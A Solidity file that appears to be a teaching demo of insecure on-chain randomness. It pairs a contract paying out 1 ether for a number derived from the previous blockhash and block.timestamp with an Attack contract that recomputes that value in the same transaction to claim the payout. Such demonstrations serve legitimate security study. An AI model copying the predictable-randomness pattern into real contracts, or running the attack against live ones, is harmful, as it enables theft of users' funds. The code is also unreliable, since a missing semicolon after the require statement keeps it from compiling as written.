//SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;


contract GuessTheRandomNumber{
	constructor() public payable {}

	function guess(uint256 _guess) public {
		uint256 answer = uint256 (
			keccak256(
				abi.encodePacked(blockhash(block.number - 1), block.timestamp)
			)
		);

		if(_guess == answer){
			(bool sent,) = msg.sender.call{value:1 ether}("");
			require(sent, "failed to send ether")
		}
	}
}

contract Attack {
	receive() external payable{}

	function attack(GuessTheRandomNumber guessTheRandomNumber) public  {
		uint256 answer = uint256(
			keccak256(
				abi.encodePacked(blockhash(block.number - 1), block.timestamp)
			)
		);

		guessTheRandomNumber.guess(answer);
	}


	function getBalance() public view returns (uint256){
		return address(this).balance;
	}
}